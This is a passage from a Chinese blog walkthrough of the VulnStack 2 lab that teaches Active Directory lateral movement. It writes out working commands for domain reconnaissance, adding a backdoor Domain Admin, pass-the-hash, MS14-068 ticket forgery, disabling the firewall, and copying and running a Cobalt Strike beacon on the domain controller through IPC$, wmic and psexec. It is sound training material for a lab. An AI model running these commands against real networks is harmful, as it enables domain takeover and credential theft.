+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">net view /domain                                 <span class="comment"># 查看所有域</span></span><br><span class="line">net time /domain                                 <span class="comment">#查看域内时间 会列出时间服务器 即域控</span></span><br><span class="line">ping <span class="literal">-n</span> <span class="number">1</span> DC <span class="literal">-4</span>                                  <span class="comment">#获取域控ip地址</span></span><br><span class="line"></span><br><span class="line">net user /domain                                 <span class="comment">#查看域用户  </span></span><br><span class="line">dsquery user                                     <span class="comment">#查看域用户</span></span><br><span class="line">net <span class="built_in">group</span> /domain                                <span class="comment">#查询域组名称</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /Domain                <span class="comment">#查询域管理员</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Controllers&quot;</span> /domain           <span class="comment">#查询域控</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加普通域用户 </span></span><br><span class="line">net user lemon iam@L3m0n /add /domain </span><br><span class="line"><span class="comment"># 将普通域用户提升为域管理员 </span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> lemon /add /domain</span><br><span class="line"><span class="comment"># 查询所有计算机名称</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Computers&quot;</span> /domain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看共享</span></span><br><span class="line">net view \\<span class="number">10.10</span>.<span class="number">10.10</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226212019678.png" alt="image-20201226212019678"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226212831005.png" alt="image-20201226212831005"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226212706841.png" alt="image-20201226212706841"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226212953380.png" alt="image-20201226212953380"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226223213140.png" alt="image-20201226223213140"></p>
+<p>端口扫描</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227175324023.png" alt="image-20201227175324023"></p>
+<p>发现存活主机</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227175544967.png" alt="image-20201227175544967"></p>
+<p>在这可以看到</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227184533845.png" alt="image-20201227184533845"></p>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="代理转发"><a href="#代理转发" class="headerlink" title="代理转发"></a>代理转发</h4><p>首先设置代理 直接使用cs sock4代理</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226224551497.png" alt="image-20201226224551497"></p>
+<p>kali proxychains设置代理  修改<code>/etc/proxychains.conf</code></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226224841142.png" alt="image-20201226224841142"></p>
+<p>使用代理打开火狐浏览器 访问127.0.0.1:7001 发现是weblogic的页面说明已经成功代理出来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains firefox</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226225412932.png" alt="image-20201226225412932"></p>
+<p>使用代理使用nmap对域控10.10.10.10进行扫描 扫描发现存在ms17-010漏洞</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201226230803732.png" alt="image-20201226230803732"></p>
+<p>这时候就有一个问题了 由于域控只有一个网卡 并且是host only模式 所以没办法直接反弹shell 需要让web机器做跳转  这个问题我们后面再说 先看看怎么把马传到域控上并执行</p>
+<h4 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass the Hash"></a>Pass the Hash</h4><p>首先我们可以使用<code>logonpasswords</code>抓取下明文密码 几个用户的密码都是这个</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227001151284.png" alt="image-20201227001151284"></p>
+<p>在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。但是目标系统为Windows 2008(64)，因此可以抓到明文密码</p>
+<p>再说说Pass the Hash，哈希传递(pth)攻击是指攻击者可以通过捕获密码的hash值(对应着密码的值),然后简单地将其传递来进行身份验证，以此来横向访问其他网络系统。</p>
+<p>直接使用cs里面的pth命令 用法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth domain\user NTLM</span><br></pre></td></tr></table></figure>
+
+<p>直接列下dc上的文件<code>shell dir \\DC.de1ay.com</code></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227115803891.png" alt="image-20201227115803891"></p>
+<p>提示拒绝访问 我们需要制作令牌</p>
+<p><strong>使用明文密码</strong></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227120102729.png" alt="image-20201227120102729"></p>
+<p><strong>使用hash</strong></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227002817926.png" alt="image-20201227002817926"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227003050858.png" alt="image-20201227003050858"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227120511013.png" alt="image-20201227120511013"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227120525412.png" alt="image-20201227120525412"></p>
+<h4 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass the Ticket"></a>Pass the Ticket</h4><p>这里使用ms14-068攻击  对应CVE-2014-6324  当拿到了一个普通域成员的账号后，想继续对该域进行渗透，如果域控服务器存在MS14_068漏洞，并且未打补丁，那么我们就可以利用MS14_068快速获得域控服务器权限 对应补丁号为kb3011780 可以从systeminfo获取 也可以使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get hotfixid</span><br></pre></td></tr></table></figure>
+
+<p>接下来使用的工具叫PyKEK  是一个利用 Kerberos 协议进行渗透测试的工具包 地址：<a target="_blank" rel="noopener" href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a> 下载下来</p>
+<p>可以使用 PyKEY 可以生成一张高权限的服务票据，并通过 mimikatz 将服务票据注入内存。</p>
+<p>先查看本地de1ay的sid</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227141212789.png" alt="image-20201227141212789"></p>
+<p>或者</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227141825575.png" alt="image-20201227141825575"></p>
+<p>查看域用户 需要system权限查看</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227142617036.png" alt="image-20201227142617036"></p>
+<p>尝试使用de1ay用户制作票据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python ms14-068.py -u de1ay@de1ay.com -s S-1-5-21-3767205380-3469466069-2137393323-500 -d 10.10.10.10 -p <span class="string">&#x27;1qaz@WSX&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227142857497.png" alt="image-20201227142857497"></p>
+<p>使用 <a target="_blank" rel="noopener" href="https://github.com/rvazarkar/KrbCredExport">KrbCredExport</a>进行转换</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python KrbCredExport.py ../pykek/TGT_de1ay@de1ay.com.ccache de1ay.ticket</span><br></pre></td></tr></table></figure>
+
+<p>用cs将票据注入内存中 先清除之前的凭证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos_ticket_purge</span><br><span class="line">kerberos_ticket_use D:\de1ay.ticket</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227144025986.png" alt="image-20201227144025986"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227144411415.png" alt="image-20201227144411415"></p>
+<p>不知道为啥不行 换成exe也不行 哭了 过段时间再研究吧 后来发现换成ip就行了 哭了</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227164803317.png" alt="image-20201227164803317"></p>
+<p>加用户Administrator不行 system可以 domain还要大写</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227165154175.png" alt="image-20201227165154175"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227165252966.png" alt="image-20201227165252966"></p>
+<p>加到管理员组</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227165559377.png" alt="image-20201227165559377"></p>
+<h4 id="IPC连接"><a href="#IPC连接" class="headerlink" title="IPC连接"></a>IPC连接</h4><p>假设现在我们现在已经增加一个用户了 实际并没 只能使用默认账户 我们可以使用ipc连接将马传上去 不知道为啥sysytem权限的会话可以直接列目录</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.10\c$ P@ssword &#x2F;user:hacker</span><br><span class="line">shell dir \\DC.de1ay.com\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227162903406.png" alt="image-20201227162903406"></p>
+<p>关闭连接的话使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net use \\10.10.10.10\c$ &#x2F;del</span><br></pre></td></tr></table></figure>
+
+<p>关闭防火墙</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+
+<p>新建一个中转</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227163835443.png" alt="image-20201227163835443"></p>
+<p>使用cs生成exe</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227163127976.png" alt="image-20201227163127976"></p>
+<p>使用shell的copy命令将马拷到dc上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy C:\Windows\Temp\artifact.exe \\10.10.10.10\c$\windows\temp\1.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227163701364.png" alt="image-20201227163701364"></p>
+<p>cs设置监听 使用wmic执行木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell wmic &#x2F;node:10.10.10.10 &#x2F;user:hacker &#x2F;password:P@ssword process call create &quot;C:\Windows\Temp\1.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>但是这样貌似不行</p>
+<h4 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h4><p>增加一个中转</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227190228378.png" alt="image-20201227190228378"></p>
+<p>目标 psexec</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227190255007.png" alt="image-20201227190255007"></p>
+<p>监听器选择中转</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227190405764.png" alt="image-20201227190405764"></p>
+<p>域控上线</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227190422985.png" alt="image-20201227190422985"></p>
+<p>同样的方式pc也能上线 全部上线截图</p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227190535767.png" alt="image-20201227190535767"></p>
+<p><img src="/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/image-20201227190607186.png" alt="image-20201227190607186"></p>
+<p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193193">https://www.anquanke.com/post/id/193193</a></p>
+<p><a target="_blank" rel="noopener" href="https://wh0ale.github.io/2019/12/11/VulnStack%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/">https://wh0ale.github.io/2019/12/11/VulnStack%E5%9F%9F%E7%8E%AF%E5%A2%83%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</a></p>
+<p><a target="_blank" rel="noopener" href="http://akevin.cn/index.php/archives/985/">http://akevin.cn/index.php/archives/985/</a></p>
+<p><a target="_blank" rel="noopener" href="https://yoga7xm.top/2019/12/03/vulnstack2/">https://yoga7xm.top/2019/12/03/vulnstack2/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8690">https://xz.aliyun.com/t/8690</a></p>
+<p><a target="_blank" rel="noopener" href="https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/">https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/</a></p>
+
+          
+            <div class='article_footer'>
+              
+                
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+
+
+  
+
+  
+    
+    
+
+<section class="widget copyright  desktop mobile">
+  <div class='content'>
+    
+      <blockquote>
+        
+          
+            <p>本文永久链接是：<a href=http://www.moonback.xyz/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/>http://www.moonback.xyz/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/</a></p>
+          
+        
+      </blockquote>
+    
+  </div>
+</section>
+
+  
+
+  
+
+
+              
+            </div>
+          
+        </div>
+        
+          
+
+
+  <section class='meta' id="footer-meta">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-07-21T22:42:57+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年7月21日</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/vulnstack/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>vulnstack</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>域渗透</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.moonback.xyz/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/&title=从VlunStack靶机二学习域渗透 - 明月归的小站&summary=闲来无事，跟着大佬思路做下！！！"
+          
+          >
+          
+            <img src="/static/images/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.moonback.xyz/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/&title=从VlunStack靶机二学习域渗透 - 明月归的小站&summary=闲来无事，跟着大佬思路做下！！！"
+          
+          >
+          
+            <img src="/static/images/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.moonback.xyz/2020/12/14/%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/%E4%BB%8EVlunStack%E9%9D%B6%E5%9C%BA%E4%BA%8C%E5%AD%A6%E4%B9%A0%E5%9F%9F%E6%B8%97%E9%80%8F/&title=从VlunStack靶机二学习域渗透 - 明月归的小站&summary=闲来无事，跟着大佬思路做下！！！"
+          
+          >
+          
+            <img src="/static/images/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2021/01/06/%E5%86%85%E9%83%A8wp/edi/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>EDI内部平台部分题目writeup</p>
+                <p class='content'>EDI内部平台部分题目writeup
+
+
+easycry题目：
+1234567891011121314151617from gmpy2 import next_primefrom random ...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/12/05/%E6%AF%94%E8%B5%9B/2020/RoarCTF2020%E9%83%A8%E5%88%86writeup/'>
+                <p class='title'>RoarCTF2020部分writeup<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>ccc 太菜了！！！
+
+
+webezsqlfuzz一下过滤了
+1空格 select union ; if
+
+写脚本bool盲注：
+12345678910111213141516171819202...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E8%AF%B4%E6%98%8E"><span class="toc-text">环境说明</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%90%8D%E8%AF%8D%E6%A6%82%E5%BF%B5"><span class="toc-text">一些名词概念</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DMZ"><span class="toc-text">DMZ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AD"><span class="toc-text">AD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DC"><span class="toc-text">DC</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="toc-text">网络配置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8Bweb%E6%9C%BA%E5%99%A8"><span class="toc-text">拿下web机器</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic%E5%88%B0cs%E4%B8%8A%E7%BA%BF"><span class="toc-text">weblogic到cs上线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cs-msf%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC"><span class="toc-text">cs&#x2F;msf会话互转</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="toc-text">拿下域控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">域内信息收集</span></a></li><li class="toc-item toc-level-3"><a 